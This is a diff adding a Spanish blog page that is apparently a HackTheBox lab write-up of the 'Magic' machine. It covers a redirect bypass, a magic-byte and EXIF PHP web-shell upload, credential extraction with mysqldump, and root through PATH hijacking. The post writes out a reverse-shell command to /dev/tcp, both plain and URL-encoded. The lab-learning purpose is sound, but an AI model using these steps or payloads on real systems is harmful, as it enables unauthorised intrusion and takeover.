@@ -1,0 +1,963 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Magic</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Magic | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Magic" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel medio. Inspeccionaremos un redireccionamiento web algo locochon, moveremos algunos Magic Bytes, iremos jugando con MySQL y haremos un Path Hijacking." />
+<meta property="og:description" content="Máquina Linux nivel medio. Inspeccionaremos un redireccionamiento web algo locochon, moveremos algunos Magic Bytes, iremos jugando con MySQL y haremos un Path Hijacking." />
+<link rel="canonical" href="http://localhost:4000/htb/magic" />
+<meta property="og:url" content="http://localhost:4000/htb/magic" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/bannermagic.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-08-22T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/bannermagic.png" />
+<meta property="twitter:title" content="HackTheBox - Magic" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2020-08-22T00:00:00-07:00","datePublished":"2020-08-22T00:00:00-07:00","description":"Máquina Linux nivel medio. Inspeccionaremos un redireccionamiento web algo locochon, moveremos algunos Magic Bytes, iremos jugando con MySQL y haremos un Path Hijacking.","headline":"HackTheBox - Magic","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/bannermagic.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/magic"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/magic"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Magic</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2020-08-22">22 Aug 2020</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/bannermagic.png" alt="HackTheBox - Magic">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel medio. Inspeccionaremos un redireccionamiento web algo locochon, moveremos algunos Magic Bytes, iremos jugando con MySQL y haremos un Path Hijacking.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/magicHTB.png" alt="magicHTB" /></p>
+
+<h3 id="tlrd-spanish-writeup">TL;RD (Spanish writeup)</h3>
+
+<blockquote>
+  <p>Explico a veces a muy bajo nivel ya que me enfoco en la gente que esta super perdida en este mundo (como yo), por si vez mucho texto ya sabes la razón.</p>
+</blockquote>
+
+<h2 id="enumeración">Enumeración.</h2>
+
+<p>Como es habitual, vemos que servicios está corriendo la maquina, en este caso con los parámetros normales el escaneo va lento, así que le agregamos algunos para evitarlo.</p>
+
+<pre><code class="language-bash">$ nmap -p- --open -v -n --min-rate=5000 10.10.10.185 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los puertos</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-n</td>
+      <td style="text-align: left">Evita que realice Host Discovery, como resolución DNS</td>
+    </tr>
+    <tr>
+      <td>–min-rate</td>
+      <td style="text-align: left">Indica que no queremos hacer peticiones menores al num que pongamos</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/initScan.png" alt="nmapInitScan" /></p>
+
+<p>Con la función que maneja <a href="https://s4vitar.github.io/">s4vitar</a> podemos extraer los números de los puertos del archivo <em>initScan</em>. En este caso se puede ver innecesario, pero si la máquina estuviera corriendo muchos puertos, evitaríamos tener que estar copiando uno a uno los puertos.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png" alt="extractPorts" /></p>
+
+<p>La ejecución es sencilla, solo se debe agregar la función al archivo <code>$ ~/.bashrc</code></p>
+
+<pre><code class="language-bash">$ extractPorts initScan
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/runextractPorts.png" alt="runextractPorts" /></p>
+
+<p>Ahora un escaneo para verificar las versiones y scripts que están manejando los servicios encontrados, en este caso el SSH(22) y el HTTP(80).</p>
+
+<pre><code class="language-bash">$ nmap -sC -sV -p22,80 10.10.10.185 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/portScan.png" alt="portScan" /></p>
+
+<p>Bien, nada relevante por ahora, a ver la web que tiene o.O</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/magicPage.png" alt="magicPage" /></p>
+
+<p>Vemos varias imágenes y algunos gif, nada relevante, vamos al apartado <code>login.php</code>. Si logramos entrar podremos subir archivos.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/loginphp.png" alt="loginphp" /></p>
+
+<p>El login no tiene nada interesante. Decido hacer un reconocimiento por fuerza bruta con <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> a ver si hay algo escondido por ahí.</p>
+
+<pre><code class="language-bash">$ dirsearch.py -u http://10.10.10.185/ -E -x 403
+</code></pre>
+
+<blockquote>
+  <p>Con <code>-x</code> excluyo las peticiones con el numero del <strong>status code</strong> 403, en este caso las peticiones en las que el servidor se niega a responder</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/dirsearchScan.png" alt="dirsearchScan" /></p>
+
+<p>Bueno acá empieza mi aprendizaje con esta máquina, precisamente vi un directo del master <strong>master</strong> <a href="https://www.twitch.tv/s4vitaar">S4vitar</a> y toco este tema que mostraré. <strong>En ese momento no tenía ni idea que</strong> Magic <strong>tenía esto</strong></p>
+
+<p>Al ver la imagen, se ve algo interesante, un archivo <code>upload.php</code> con status code <strong>302</strong>, que hace alusión a un <em>redirect</em>, lo que quiere decir en este caso que al querer ingresar a <code>upload.php</code> nos va a redirigir a <code>login.php</code>, así de sencillo, entonces para poder ver <code>upload.php</code> se debe evitar el redirect. Con BurpSuite se puede interceptar la trama y modificar el status code, pasando de 302 (redirect al login) a un <strong>200</strong> (en el que el servidor entenderá que todo esta <strong>OK</strong> y podremos ver el contenido de <code>upload.php</code></p>
+
+<p>El procedimiento sería así:</p>
+
+<ul>
+  <li>Habilitar la recepción de respuestas por parte del servidor en BurpSuite</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burpInterceptServer.png" alt="burpInterceptServer" /></p>
+
+<ul>
+  <li>Interceptar la petición de <code>upload.php</code>, oprimir <strong>Forward</strong> para procesar la petición y así obtener la respuesta OK</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burpUpload302.png" alt="burpUpload302" /></p>
+
+<ul>
+  <li>Como se comentó antes, la idea es cambiar el redirect (302) por un OK (200) para que me deje ver el contenido.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burpUpload200.png" alt="burpUpload200" /></p>
+
+<p>Se oprime <strong>Forward</strong> y esto es lo que responde:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/pageUploadphp.png" alt="pageUploadphp" /></p>
+
+<p>Perfe, veo el contenido de <code>upload.php</code>, para solventar el problema de que si queremos volver a visitar <code>upload.php</code> nos va a redireccionar de nuevo a <code>login.php</code>, podemos asignar una regla en Burp que si recibe una petición en el header con <strong>302</strong> me la cambie por un <strong>200</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burpMatchReplace.png" alt="burpMatchReplace" /></p>
+
+<p>Ahora intentaremos subir una imagen <code>.jpg</code> con contenido <code>php</code>, un simple Remote Command Execution (RCE)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burplllx1.png" alt="burplllx1" /></p>
+
+<p>Interceptando la petición con Burp se vería así</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burplllx2.png" alt="burplllx2" /></p>
+
+<p>Dando clic en <strong>Forward</strong> responde</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/burplllx3error.png" alt="burplllx3error" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/pagelllx3error.png" alt="pagelllx3error" /></p>
+
+<p>Pues NO, no es tan fácil. Tomando en cuenta algunos CTF y el nombre de la máquina <em>Magic</em> caí en cuenta de los <strong>Magic Numbers</strong> de los archivos. Básicamente son signaturas que establecen que tipo de archivo se está trabajando, se identifican viendo el archivo en formato hexadecimal, el tipo de archivo lo dictaran generalmente los primeros 4 bytes</p>
+
+<ul>
+  <li><a href="https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5">Pequeña info sobre <strong>magic numbers</strong></a>.</li>
+</ul>
+
+<p>Así que cambiando los primeros bytes usando <code>$ hexeditor</code> por los correspondientes a un archivo JPEG:</p>
+
+<blockquote>
+  <p>JPEG File Interchange Format - .jpg - ff d8 ff e0</p>
+</blockquote>
+
+<p>Quedaría así el archivo y su tipo. <strong>Antes:</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/hexeditorbefore.png" alt="hexeditorbefore" /></p>
+
+<p><strong>Después</strong>, además agregaremos 4 bytes al inicio (4 puntos) para que no sobreescriba lo que ya tenemos</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/hexeditordots.png" alt="hexeditordots" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/hexeditorJPEG.png" alt="hexeditorJPEG" /></p>
+
+<p>Y finalmente tenemos el archivo</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/filelllxafterhex.png" alt="filelllxafterhex" /></p>
+
+<p>A ver si logro pasar el filtro e.e</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/pagelllxdone.png" alt="pagelllxdone" /></p>
+
+<p>OOOKKKOKOKKKK… imagen arriba</p>
+
+<p>Al intentar verla sale error, lo más probable y obvio es que la imagen al no tener contenido de <em>imagen</em> y solo código <code>php</code> no entiende como interpretarla. El siguiente paso sería subir el <code>.htaccess</code> con las instrucciones que le permitan al servidor interpretar los archivos <code>.jpg</code> como <code>php</code>. En ese caso nos dejaría ver la imagen y ejecutar el código. Pero después de probar no logre burlar el bypass para subir el <code>.htaccess</code>. Así que acá volví a aprender algo:</p>
+
+<p>Toda imagen maneja metadatos, que serian los datos dentro del dato, algunos ejemplos de lo que recolecciona sería: el tamaño, fecha de creación, usuario que la modifico o la creo… Creo que ya se entiende la idea.</p>
+
+<p>Consultando por internet, encontré que se pueden usar los metadatos para ejecutar un backdoor. En este caso <strong>dentro de un tag</strong> de los metadatos, puedo ingresar el código php (o lo que sea), que posteriormente el navegador lo interpretará y ejecutará. Usaremos <code>$ exiftool</code> para ver y editar los metadatos.</p>
+
+<ul>
+  <li><a href="https://ironhackers.es/herramientas/img-upload-rce-cheat-sheet/">img-upload-rce-cheat-sheet</a></li>
+  <li><a href="http://underc0deblog.blogspot.com/2015/04/ocultar-codigo-php-en-una-imagen.html">ocultar-codigo-php-en-una-imagen</a></li>
+</ul>
+
+<h5 id="1-obtener-cualquier-imagen">1. Obtener cualquier imagen</h5>
+<h5 id="2-agregar-metadato-malicioso">2. Agregar metadato malicioso</h5>
+
+<p>Imagen antes:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/exift23before.png" alt="exift23before" /></p>
+
+<p>Imagen después de insertar el tag modificado:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/exift23after.png" alt="exift23after" /></p>
+
+<blockquote>
+  <p>Va el código php que permitira desde la misma url (GET) pasarle la instrucción a ejecutar en el sistema.</p>
+</blockquote>
+
+<ul>
+  <li><strong>__halt_compiler()</strong> hace que el servidor no ejecute los datos de la propia imagen.</li>
+</ul>
+
+<h5 id="3-cambiar-la-extensión-de-la-imagen-de-jpg-a-phpjpg-y-subirla">3. Cambiar la extensión de la imagen de <code>.jpg</code> a <code>.php.jpg</code> y subirla</h5>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/page23upload.png" alt="page23upload" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/page23whoami.png" alt="page23whoami" /></p>
+
+<p>Perfecto, podemos ejecutar comandos, ahora intentaremos obtener una Shell reversa.</p>
+
+<pre><code class="language-bash">http://10.10.10.185/images/uploads/23.php.jpg?cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.69/1233 0&gt;&amp;1'
+</code></pre>
+
+<p>Pero no hace nada, pasando la consulta a URL Encode, quedaría así:</p>
+
+<pre><code class="language-bash">http://10.10.10.185/images/uploads/23.php.jpg?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.69%2F1233%200%3E%261%27
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/reverseshellwwwdata.png" alt="reverseshellwwwdata" /></p>
+
+<p>Listo, estamos dentro :)</p>
+
+<p>Lo siguiente (óptimo, necesario, preferible) es hacer tratamiento de la tty (entorno de entrada y salida de texto), ya que la Shell que tenemos no es completamente interactiva, acá me apoyo de s4vitar (aún no me aprendo los pasos :P)</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=amKkzk-yP14&amp;t=953">Video de s4vitar explicando</a>.</li>
+</ul>
+
+<p>Y ahora a enumerar… Hay varios archivos interesantes en <code>$ ls /var/www/Magic</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsls_la.png" alt="rsls_la" /></p>
+
+<p>El archivo <code>db.php5</code> tiene unas credenciales, que coinciden con el único usuario que hay en el sistema aparte de root: <strong>theseus</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsdbphp5.png" alt="rsdbphp5" /></p>
+
+<p>Pero probando <code>$ su theseus</code> no es válida. Así que no va por ahí (por no leer bien el archivo, ya veremos por que), también está el archivo <code>index.php</code> el cual tiene la generación del banner inicial con todas las imágenes y además valida si alguna tiene algo relacionado con <code>php</code> o demás cosas extrañas.</p>
+
+<p>Pero de los archivos el unico interesante es <code>db.php5</code> que claramente nos tiene que servir para algo ya que tiene credenciales.</p>
+
+<p>Revisandolo bien (ahora si) se ve que la conexion la esta haciendo a una base de datos <strong>MySQL</strong>, pero el sistema al hacer <code>$ mysql</code> no lo reconoce, asi que primero intente hacer una conexion remota por medio de ssh, pero no servia, despues de buscar formas no encontre nada, asi que simplemente hice el auto completado normal cuando se quiere evitar escribir toda la instruccion o programa, entonces al hacer <strong><code>$ mysql + TAB TAB</code></strong>, me mostro varias opciones que se pueden usar mediante mysql.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsmysqltabtab.png" alt="rsmysqltabtab" /></p>
+
+<p>Hay varias opciones, leyendo en internet sobre algunas interesantes encontré:</p>
+
+<pre><code class="language-bash">$ mysqlshow -u theseus -p 
+</code></pre>
+
+<p>Nos indicara informacion estructural de la base de datos. (La <strong>-p</strong> hará que la consola pida la pw, en este caso se usa la encontrada en <code>db.php5</code>) Siguiendo la estructura de la base de datos encontrada y su tabla, lo que se encontraría se mostraría así</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsmysqlshow.png" alt="rsmysqlshow" /></p>
+
+<p>Pero de acá no puedo encontrar info que me sirva para explotar el servicio.</p>
+
+<p>Tambien hay un programa que me permite extraer un tipo de backup de la creacion de tablas, data y de la propia base de datos. Como cuando se hace un <strong>export</strong> de una base de datos en MySQL Admin.</p>
+
+<pre><code class="language-bash">$ mysqldump -u theseus -p Magic
+</code></pre>
+
+<p>Magic, que sería la base de datos encontrada con <code>$ mysqlshow</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsmysqldump.png" alt="rsmysqldump" /></p>
+
+<p>En las ultimas instrucciones se ve que ingresa a la base de datos un usuario llamado <strong>admin</strong> con una contraseña. Si usamos esa password con el usuario <strong>theseus</strong> logramos obtener una shell con él.</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Revisando los permisos que tiene <code>theseus</code> me indica que no puede correr nada como <code>$ sudo</code>. Asi que mirando la info de los grupos relacionados encontre que esta en uno llamado <strong>users</strong>, me dio curiosidad así que si buscamos que archivos del sistema estan catalogados a ese grupo, vemos que solo hay uno, <code>/bin/sysinfo</code> (es un archivo que no habia visto antes y que mi sistema base no reconoce). Al ejecutarlo, exactamente trae info (alguna) del sistema.</p>
+
+<p>Para ver que hace por detras y como puede estar haciendolo se pueden usar varias herramientas (strace, ltrace, strings, cat). Yo mostraré con <strong>strings</strong> ya que se ve claro el vector de ataque.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rssysinfoid.png" alt="rssysinfoid" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rssysinfostrings.png" alt="rssysinfostrings" /></p>
+
+<p>Como se ve esta ejecutando 4 instrucciones, entre ellas <code>$ fdisk</code> (ayuda a la gestion y administracion del espacio en el disco duro). Con 3 de esas aplicaciones puedo lograr la explotacion y escalada de privilegios, basicamente por que la tarea esta siendo llamada por el usuario <code>root</code>, asi que todas las tareas tendran ese plus. El metodo de explotacion se llama <strong>path hijacking</strong>.</p>
+
+<p>Basicamente lo que hace es que como siempre al ejecutar algun programa el sistema va a buscarlo en algun directorio del path <code>$ echo $PATH</code>, entonces (en este ejemplo) pueda que <code>fdisk</code> este en <code>/usr/bin/fdisk</code>, el atacante se aprovecha de eso agregando en el <strong>path</strong> algun directorio donde <strong>él</strong> tenga un archivo llamado <code>fdisk</code> con <strong>instrucciones que hagan lo que el quiera</strong>.</p>
+
+<ul>
+  <li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">Otra explicación: linux-privilege-escalation-using-path-variable</a>.</li>
+</ul>
+
+<p>Pero como todo se aprende y se entiende en la practica, vamo a darle. La explotacion es sencilla, encontrarla me llevo un tiempito :P</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rschangepath.png" alt="rschangepath" /></p>
+
+<ol>
+  <li>Guardar la instruccion que queremos que haga <code>fdisk</code>.</li>
+  <li>Darle todos los permisos al archivo.</li>
+  <li>Actualizar el <strong>PATH</strong> para que inserte el directorio donde esta el archivo <code>fdisk</code> creado y ademas agregarle el <code>$PATH</code> que ya tiene actualmente.</li>
+  <li>Ejecutar el binario <code>$ /bin/sysinfo</code> que llamara nuestro <code>fdisk</code>.</li>
+</ol>
+
+<p>Pero al ejecutarlo por alguna razón que no entiendo no me muestra el output</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rssysinfofail.png" alt="rssysinfofail" /></p>
+
+<p>Así que diciendole que me haga otra ReverseShell pero ya con el user <code>root</code> ejecuta:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rssysinfodone.png" alt="rssysinfodone" /></p>
+
+<p>Perfectowow soy <strong>root</strong>, acá las flags :)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/rsroot.png" alt="rsroot" /></p>
+
+<p>…</p>
+
+<p>Es mi primera maquina <strong>Medium</strong> pero no se me dificulto tanto. Siguiendo el consejo de s4vitar, hay que darle a cualquier maquina, ya que nos podemos estar perdiendo de mucho aprendizaje, practicando, viendo videos y leyendo mucho he logrado avanzar mas de lo que tenia pensado. A darle duro, a romper todo (las maquinas tambien :P)</p>
+
+<p>Muy buena maquina, me gusto mucho ademas de experimentar por primera vez con un secuestro de ruta. Encantado de poder brindarle algo de conocimiento a alguien, muchas gracias por querer aprender y no ponerte limites (:</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Magic&url=http://localhost:4000/htb/magic" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#file-upload">file-upload</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#magic-bytes">magic-bytes</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#path-hijacking">path-hijacking</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/love">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344banner.png" alt="HackTheBox - Love"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/love">HackTheBox - Love</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil, escanearemos archivos locales (localhost) en busca de malware e.e Encontraremos credenciales y generaremos votantes con fotos de perfil peligrosas… Jugaremos con registros e instalaremos paquetes MSI...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">07 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
